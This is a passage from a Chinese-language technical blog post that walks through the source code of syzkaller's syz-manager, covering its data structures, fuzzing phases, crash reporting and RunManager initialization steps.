class="hljs-type">bool</span><br>checkResult    *rpctype.CheckArgs<br>fresh          <span class="hljs-type">bool</span><br>numFuzzing     <span class="hljs-type">uint32</span><br>numReproducing <span class="hljs-type">uint32</span><br><br>dash *dashapi.Dashboard<br><br>mu                    sync.Mutex<br>phase                 <span class="hljs-type">int</span><br>targetEnabledSyscalls <span class="hljs-keyword">map</span>[*prog.Syscall]<span class="hljs-type">bool</span><br><br>candidates       []rpctype.Candidate <span class="hljs-comment">// untriaged inputs from corpus and hub</span><br>disabledHashes   <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-keyword">struct</span>&#123;&#125;<br>corpus           <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]CorpusItem<br>seeds            [][]<span class="hljs-type">byte</span><br>newRepros        [][]<span class="hljs-type">byte</span><br>lastMinCorpus    <span class="hljs-type">int</span><br>memoryLeakFrames <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">bool</span><br>dataRaceFrames   <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">bool</span><br>saturatedCalls   <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">bool</span><br><br>needMoreRepros <span class="hljs-keyword">chan</span> <span class="hljs-keyword">chan</span> <span class="hljs-type">bool</span><br>hubReproQueue  <span class="hljs-keyword">chan</span> *Crash<br>reproRequest   <span class="hljs-keyword">chan</span> <span class="hljs-keyword">chan</span> <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">bool</span><br><br><span class="hljs-comment">// For checking that files that we are using are not changing under us.</span><br><span class="hljs-comment">// Maps file name to modification time.</span><br>usedFiles <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]time.Time<br><br>modules            []host.KernelModule<br>coverFilter        <span class="hljs-keyword">map</span>[<span class="hljs-type">uint32</span>]<span class="hljs-type">uint32</span><br>coverFilterBitmap  []<span class="hljs-type">byte</span><br>modulesInitialized <span class="hljs-type">bool</span><br><br>assetStorage *asset.Storage<br>&#125;<br></code></pre></td></tr></table></figure><p>这里只说明比较关键的几个字段：</p><ul><li><code>cfg</code>：基本设置信息，对应存放在一个 json 文件中</li><li><code>vmPool</code> ：所用的 VM Pool</li><li><code>reporter</code>：用以报告 crash</li><li><code>serv</code> ：RPC Server，用以与 Guest 间通信</li><li><code>corpusDB</code>：存放语料的数据库</li><li><code>targetEnabledSyscalls</code>：测试用例所允许使用的系统调用</li><li><code>candidates</code>：待执行测试用例</li><li><code>corpus</code>：语料库</li><li><code>seeds</code>：用来对语料库变异的种子</li></ul><h3 id="2-fuzzing-phase"><a href="#2-fuzzing-phase" class="headerlink" title="2. fuzzing phase"></a>2. fuzzing phase</h3><p><code>syz-manager</code> 中将 fuzzing 流程分为如下的不同阶段：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">const</span> (<br><span class="hljs-comment">// 刚刚开始，啥都没做.</span><br>phaseInit = <span class="hljs-literal">iota</span><br><span class="hljs-comment">// 加载了语料库且检查了机器.</span><br>phaseLoadedCorpus<br><span class="hljs-comment">// 从语料库中分类了所有输入.</span><br><span class="hljs-comment">// 这是我们开始查询 hub 与最小化连续语料库的时候.</span><br>phaseTriagedCorpus<br><span class="hljs-comment">// 第一个请求发送到了 hub.</span><br>phaseQueriedHub<br><span class="hljs-comment">// 分类所有来自 hub 的新输入.</span><br><span class="hljs-comment">// 这是我们开始复现 crashes 的时候.</span><br>phaseTriagedHub<br>)<br></code></pre></td></tr></table></figure><h2 id="Fuzzing-结果相关"><a href="#Fuzzing-结果相关" class="headerlink" title="Fuzzing 结果相关"></a>Fuzzing 结果相关</h2><h3 id="1-Crash：记录-crash-信息"><a href="#1-Crash：记录-crash-信息" class="headerlink" title="1. Crash：记录 crash 信息"></a>1. Crash：记录 crash 信息</h3><p><code>manager.go</code> 中定义了<code>Crash</code> 结构体用以记录产生 crash 的 VM、机器信息等，<strong>真正的 crash 信息主要存放在一个 <code>Report</code> 结构体中</strong>：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Crash <span class="hljs-keyword">struct</span> &#123;<br>vmIndex <span class="hljs-type">int</span><br>hub     <span class="hljs-type">bool</span> <span class="hljs-comment">// this crash was created based on a repro from hub</span><br>*report.Report<br>machineInfo []<span class="hljs-type">byte</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="2-Report：单次执行结果报告"><a href="#2-Report：单次执行结果报告" class="headerlink" title="2. Report：单次执行结果报告"></a>2. Report：单次执行结果报告</h3><p><code>pkg/report/rteport.go</code> 中的 <code>Report</code> 结构体用以表示单次执行的结果，包括是否产生了 crash、Oops 的信息等等：</p><ul><li><p><code>Title</code>：<strong>Oops 的第一行文本，用来标识特定类型的 crash</strong></p><blockquote><p>例如 <code>BUG: unable to handle page fault for address: ffffffff81001619</code> 这样的</p></blockquote></li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Report <span class="hljs-keyword">struct</span> &#123;<br><span class="hljs-comment">// Title contains a representative description of the first oops.</span><br>Title <span class="hljs-type">string</span><br><span class="hljs-comment">// Alternative titles, used for better deduplication.</span><br><span class="hljs-comment">// If two crashes have a non-empty intersection of Title/AltTitles, they are considered the same bug.</span><br>AltTitles []<span class="hljs-type">string</span><br><span class="hljs-comment">// Bug type (e.g. hang, memory leak, etc).</span><br>Type Type<br><span class="hljs-comment">// The indicative function name.</span><br>Frame <span class="hljs-type">string</span><br><span class="hljs-comment">// Report contains whole oops text.</span><br>Report []<span class="hljs-type">byte</span><br><span class="hljs-comment">// Output contains whole raw console output as passed to Reporter.Parse.</span><br>Output []<span class="hljs-type">byte</span><br><span class="hljs-comment">// StartPos/EndPos denote region of output with oops message(s).</span><br>StartPos <span class="hljs-type">int</span><br>EndPos   <span class="hljs-type">int</span><br><span class="hljs-comment">// SkipPos is position in output where parsing for the next report should start.</span><br>SkipPos <span class="hljs-type">int</span><br><span class="hljs-comment">// Suppressed indicates whether the report should not be reported to user.</span><br>Suppressed <span class="hljs-type">bool</span><br><span class="hljs-comment">// Corrupted indicates whether the report is truncated of corrupted in some other way.</span><br>Corrupted <span class="hljs-type">bool</span><br><span class="hljs-comment">// CorruptedReason contains reason why the report is marked as corrupted.</span><br>CorruptedReason <span class="hljs-type">string</span><br><span class="hljs-comment">// Recipients is a list of RecipientInfo with Email, Display Name, and type.</span><br>Recipients vcs.Recipients<br><span class="hljs-comment">// GuiltyFile is the source file that we think is to blame for the crash  (filled in by Symbolize).</span><br>GuiltyFile <span class="hljs-type">string</span><br><span class="hljs-comment">// reportPrefixLen is length of additional prefix lines that we added before actual crash report.</span><br>reportPrefixLen <span class="hljs-type">int</span><br><span class="hljs-comment">// symbolized is set if the report is symbolized.</span><br>symbolized <span class="hljs-type">bool</span><br>&#125;<br></code></pre></td></tr></table></figure><h1 id="0x02-main-：加载配置文件，启动-manager"><a href="#0x02-main-：加载配置文件，启动-manager" class="headerlink" title="0x02. main()：加载配置文件，启动 manager"></a>0x02. main()：加载配置文件，启动 manager</h1><p><code>syz-manager</code> 的 <code>main()</code> 函数其实比较简单，主要就是载入配置文件信息并调用 <code>RunManager()</code> ：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">if</span> prog.GitRevision == <span class="hljs-string">&quot;&quot;</span> &#123;<br>log.Fatalf(<span class="hljs-string">&quot;bad syz-manager build: build with make, run bin/syz-manager&quot;</span>)<br>&#125;<br>flag.Parse()<br>log.EnableLogCaching(<span class="hljs-number">1000</span>, <span class="hljs-number">1</span>&lt;&lt;<span class="hljs-number">20</span>)<br>cfg, err := mgrconfig.LoadFile(*flagConfig)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatalf(<span class="hljs-string">&quot;%v&quot;</span>, err)<br>&#125;<br>RunManager(cfg)<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p><del>👴寻思好像没什么好说的</del></p></blockquote><h1 id="0x03-RunManager-：进行初始化工作"><a href="#0x03-RunManager-：进行初始化工作" class="headerlink" title="0x03. RunManager()：进行初始化工作"></a>0x03. RunManager()：进行初始化工作</h1><h3 id="Step-1-初始化-VM-Pool"><a href="#Step-1-初始化-VM-Pool" class="headerlink" title="Step 1. 初始化 VM Pool"></a>Step 1. 初始化 VM Pool</h3><p>首先是初始化 VM Pool，这里调用了 <code>vm/vm.go</code> 中的 <code>Create()</code> 来完成 VM pool 的创建</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">var</span> vmPool *vm.Pool<br>   <span class="hljs-comment">// &quot;none&quot; 类型对于调试/开发而言是一种特殊情况，manager 并不会启动任何 VM，</span><br>   <span class="hljs-comment">// 但相应的是你应当手动启动 VM 并在此启动 syz-fuzzer.</span><br><span class="hljs-keyword">if</span> cfg.Type != <span class="hljs-string">&quot;none&quot;</span> &#123;<br><span class="hljs-keyword">var</span> err <span class="hljs-type">error</span><br>vmPool, err = vm.Create(cfg, *flagDebug)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatalf(<span class="hljs-string">&quot;%v&quot;</span>, err)<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>该函数主要就是获取 VM 类型、封装一个 Env 结构体、调用对应类型 VM Pool 的构造函数：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// Create 创建一个可用于创建独立 VMs 的 VM pool.</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Create</span><span class="hljs-params">(cfg *mgrconfig.Config, debug <span class="hljs-type">bool</span>)</span></span> (*Pool, <span class="hljs-type">error</span>) &#123;<br>typ, ok := vmimpl.Types[cfg.Type]<br><span class="hljs-keyword">if</span> !ok &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;unknown instance type &#x27;%v&#x27;&quot;</span>, cfg.Type)<br>&#125;<br>env := &amp;vmimpl.Env&#123;<br>Name:      cfg.Name,<br>OS:        cfg.TargetOS,<br>Arch:      cfg.TargetVMArch,<br>Workdir:   cfg.Workdir,<br>Image:     cfg.Image,<br>SSHKey:    cfg.SSHKey,<br>SSHUser:   cfg.SSHUser,<br>Timeouts:  cfg.Timeouts,<br>Debug:     debug,<br>Config:    cfg.VM,<br>KernelSrc: cfg.KernelSrc,<br>&#125;<br>impl, err := typ.Ctor(env)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>&#125;<br><span class="hljs-keyword">return</span> &amp;Pool&#123;<br>impl:     impl,<br>workdir:  env.Workdir,<br>template: cfg.WorkdirTemplate,<br>timeouts: cfg.Timeouts,<br>&#125;, <span class="hljs-literal">nil</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Step-2-初始化-Manager，载入语料库，建立通信服务器"><a href="#Step-2-初始化-Manager，载入语料库，建立通信服务器" class="headerlink" title="Step 2. 初始化 Manager，载入语料库，建立通信服务器"></a>Step 2. 初始化 Manager，载入语料库，建立通信服务器</h3><p>随后会创建用于存储 crash 的文件夹与一个新的 Reporter 实例：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go">crashdir := filepath.Join(cfg.Workdir, <span class="hljs-string">&quot;crashes&quot;</span>)<br>osutil.MkdirAll(crashdir)<br><br>reporter, err := report.NewReporter(cfg)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatalf(<span class="hljs-string">&quot;%v&quot;</span>, err)<br>&#125;<br></code></pre></td></tr></table></figure><p>接下来创建一个基本的 Manager 实例，然后是四步走：</p><ul><li><p><code>preloadCorpus()</code>：检查 <code>corpus.db</code> 文件是否存在（若不存在则创建）并载入 <code>sys/要fuzz的OS/test</code> 目录下的测试用模板</p><blockquote><p>语料库载入的模板本身类似于 syzlang 文件，例如 <code>sys/linux/pipe</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs syzlang">pipe2(&amp;(0x7f0000000000)=&#123;&lt;r0=&gt;0x0, &lt;r1=&gt;0x0&#125;, 0x0)<br>close(r0)<br>close(r1)<br></code></pre></td></tr></table></figure></blockquote></li><li><p><code>initStats()</code>：注册一个 prometheus 监视器（一个开源的监视&amp;预警工具包）</p></li><li><p><code>initHTTP()</code>：创建一个 HTTP 服务器并注册一系列的目录（用以供使用者访问）</p></li><li><p><code>collectUsedFiles()</code>：检查所需文件是否存在</p></li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs go">mgr := &amp;Manager&#123;<br>cfg:              cfg,<br>vmPool:           vmPool,<br>target:           cfg.Target,<br>sysTarget:        cfg.SysTarget,<br>reporter:         reporter,<br>crashdir:         crashdir,<br>startTime:        time.Now(),<br>stats:            &amp;Stats&#123;haveHub: cfg.HubClient != <span class="hljs-string">&quot;&quot;</span>&#125;,<br>crashTypes:       <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">bool</span>),<br>corpus:           <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]CorpusItem),<br>disabledHashes:   <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-keyword">struct</span>&#123;&#125;),<br>memoryLeakFrames: <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">bool</span>),<br>dataRaceFrames:   <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">bool</span>),<br>fresh:            <span class="hljs-literal">true</span>,<br>vmStop:           <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-type">bool</span>),<br>hubReproQueue:    <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> *Crash, <span class="hljs-number">10</span>),<br>needMoreRepros:   <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-keyword">chan</span> <span class="hljs-type">bool</span>),<br>reproRequest:     <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-keyword">chan</span> <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">bool</span>),<br>usedFiles:        <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]time.Time),<br>saturatedCalls:   <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">bool</span>),<br>&#125;<br><br>mgr.preloadCorpus()<br>mgr.initStats() <span class="hljs-comment">// 初始化 prometheus 变量.</span><br>mgr.initHTTP()  <span class="hljs-comment">// 创建 HTTP 服务.</span><br>mgr.collectUsedFiles()<br></code></pre></td></tr></table></figure><p>之后创建一个 RPC Server，用以在 Host 与 Guest VMs 之间进行通信：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// Create 为 fuzzer 创建 PRC 服务器.</span><br>mgr.serv, err = startRPCServer(mgr)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatalf(<span class="hljs-string">&quot;failed to create rpc server: %v&quot;</span>, err)<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Step-3-初始化-dashboard-相关"><a href="#Step-3-初始化-dashboard-相关" class="headerlink" title="Step 3.  初始化 dashboard 相关"></a><em>Step 3.  初始化 dashboard 相关</em></h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">if</span> cfg.DashboardAddr != <span class="hljs-string">&quot;&quot;</span> &#123;<br>mgr.dash, err = dashapi.New(cfg.DashboardClient, cfg.DashboardAddr, cfg.DashboardKey)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatalf(<span class="hljs-string">&quot;failed to create dashapi connection: %v&quot;</span>, err)<br>&#125;<br>&#125;<br><br><span class="hljs-keyword">if</span> !cfg.AssetStorage.IsEmpty() &#123;<br>mgr.assetStorage, err = asset.StorageFromConfig(cfg.AssetStorage, mgr.dash)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatalf(<span class="hljs-string">&quot;failed to init asset storage: %v&quot;</span>, err)<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Step-4-创建【日志输出】协程"><a href="#Step-4-创建【日志输出】协程" class="headerlink" title="Step 4. 创建【日志输出】协程"></a>Step 4. 创建【日志输出】协程</h3><p>接下来会新起一个协程进行数据记录的工作，内部其实就是一个<strong>每 10s 进行一次进度采集并输出日志的无限循环</strong>，主要是采集执行信息、语料覆盖率、crashes 信息等：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">for</span> lastTime := time.Now(); ; &#123;<br>time.Sleep(<span class="hljs-number">10</span> * time.Second)<br>now := time.Now()<br>diff := now.Sub(lastTime)<br>lastTime = now<br>mgr.mu.Lock()<br><span class="hljs-keyword">if</span> mgr.firstConnect.IsZero() &#123;<br>mgr.mu.Unlock()<br><span class="hljs-keyword">continue</span><br>&#125;<br>mgr.fuzzingTime += diff * time.Duration(atomic.LoadUint32(&amp;mgr.numFuzzing))<br>executed := mgr.stats.execTotal.get()<br>crashes := mgr.stats.crashes.get()<br>corpusCover := mgr.stats.corpusCover.get()<br>corpusSignal := mgr.stats.corpusSignal.get()<br>maxSignal := mgr.stats.maxSignal.get()<br>mgr.mu.Unlock()<br>numReproducing := atomic.LoadUint32(&amp;mgr.numReproducing)<br>numFuzzing := atomic.LoadUint32(&amp;mgr.numFuzzing)<br><br>log.Logf(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;VMs %v, executed %v, cover %v, signal %v/%v, crashes %v, repro %v&quot;</span>,<br>numFuzzing, executed, corpusCover, corpusSignal, maxSignal, crashes, numReproducing)<br>&#125;<br>&#125;()<br></code></pre></td></tr></table></figure><h3 id="Step-5-创建-bench-协程（每隔一分钟最小化语料库并将-bench-data-写入-bench-文件）"><a href="#Step-5-创建-bench-协程（每隔一分钟最小化语料库并将-bench-data-写入-bench-文件）" class="headerlink" title="Step 5. 创建 bench 协程（每隔一分钟最小化语料库并将 bench data 写入 bench 文件）"></a>Step 5. 创建 bench 协程（每隔一分钟最小化语料库并将 bench data 写入 bench 文件）</h3><p>这里会判断命令行传入参数是否有 <code>bench=</code>，若是则调用 <code>initBench()</code>：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">if</span> *flagBench != <span class="hljs-string">&quot;&quot;</span> &#123;<br>mgr.initBench()<br>&#125;<br></code></pre></td></tr></table></figure><p> 这里的 <code>flagBench</code> 是一个全局的 flag 变量，golang 提供了一个 <code>flag</code> 包用以处理命令行参数：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">var</span> (<br>flagConfig = flag.String(<span class="hljs-string">&quot;config&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;configuration file&quot;</span>)<br>flagDebug  = flag.Bool(<span class="hljs-string">&quot;debug&quot;</span>, <span class="hljs-literal">false</span>, <span class="hljs-string">&quot;dump all VM output to console&quot;</span>)<br>flagBench  = flag.String(<span class="hljs-string">&quot;bench&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;write execution statistics into this file periodically&quot;</span>)<br>)<br></code></pre></td></tr></table></figure><p><code>initBench()</code> 会启动一个协程，主要就是一个每隔一分钟运行一次的循环：</p><ul><li>调用 <code>minimizeCorpus()</code> 将语料库进行最小化</li><li>向 <code>bench</code> 参数指定的文件当中写入 <code>语料库长度、启动时间、fuzzing 时间\n</code></li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(mgr *Manager)</span></span> initBench() &#123;<br>f, err := os.OpenFile(*flagBench, os.O_WRONLY|os.O_CREATE|os.O_EXCL, osutil.DefaultFilePerm)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatalf(<span class="hljs-string">&quot;failed to open bench file: %v&quot;</span>, err)<br>&#125;<br><span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">for</span> &#123;<br>time.Sleep(time.Minute)<br>vals := mgr.stats.all()<br>mgr.mu.Lock()<br><span class="hljs-keyword">if</span> mgr.firstConnect.IsZero() &#123;<br>mgr.mu.Unlock()<br><span class="hljs-keyword">continue</span><br>&#125;<br>mgr.minimizeCorpus()<br>vals[<span class="hljs-string">&quot;corpus&quot;</span>] = <span class="hljs-type">uint64</span>(<span class="hljs-built_in">len</span>(mgr.corpus))<br>vals[<span class="hljs-string">&quot;uptime&quot;</span>] = <span class="hljs-type">uint64</span>(time.Since(mgr.firstConnect)) / <span class="hljs-number">1e9</span><br>vals[<span class="hljs-string">&quot;fuzzing&quot;</span>] = <span class="hljs-type">uint64</span>(mgr.fuzzingTime) / <span class="hljs-number">1e9</span><br>mgr.mu.Unlock()<br><br>data, err := json.MarshalIndent(vals, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;  &quot;</span>)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatalf(<span class="hljs-string">&quot;failed to serialize bench data&quot;</span>)<br>&#125;<br><span class="hljs-keyword">if</span> _, err := f.Write(<span class="hljs-built_in">append</span>(data, <span class="hljs-string">&#x27;\n&#x27;</span>)); err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatalf(<span class="hljs-string">&quot;failed to write bench data&quot;</span>)<br>&#125;<br>&#125;<br>&#125;()<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Step-6-启动-dashboard-协程，进入下一阶段"><a href="#Step-6-启动-dashboard-协程，进入下一阶段" class="headerlink" title="Step 6. 启动 dashboard 协程，进入下一阶段"></a>Step 6. 启动 dashboard 协程，进入下一阶段</h3><p>接下来会启动一个新的协程，主要是 <em>每隔一分钟上报一次 syz-manager 的状态，这里不再展开</em> ：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">if</span> mgr.dash != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">go</span> mgr.dashboardReporter()<br>&#125;<br></code></pre></td></tr></table></figure><p>最后会简单检查一下 VM Pool ，随后调用 <code>vmLoop()</code> 进入下一阶段：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs go">osutil.HandleInterrupts(vm.Shutdown)<br><span class="hljs-keyword">if</span> mgr.vmPool == <span class="hljs-literal">nil</span> &#123;<br>log.Logf(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;no VMs started (type=none)&quot;</span>)<br>log.Logf(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;you are supposed to start syz-fuzzer manually as:&quot;</span>)<br>log.Logf(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;syz-fuzzer -manager=manager.ip:%v [other flags as necessary]&quot;</span>, mgr.serv.port)<br>&lt;-vm.Shutdown<br><span class="hljs-keyword">return</span><br>&#125;<br>mgr.vmLoop()<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="0x04-vmLoop-：启动-fuzzing，管控整体流程"><a href="#0x04-vmLoop-：启动-fuzzing，管控整体流程" class="headerlink" title="0x04. 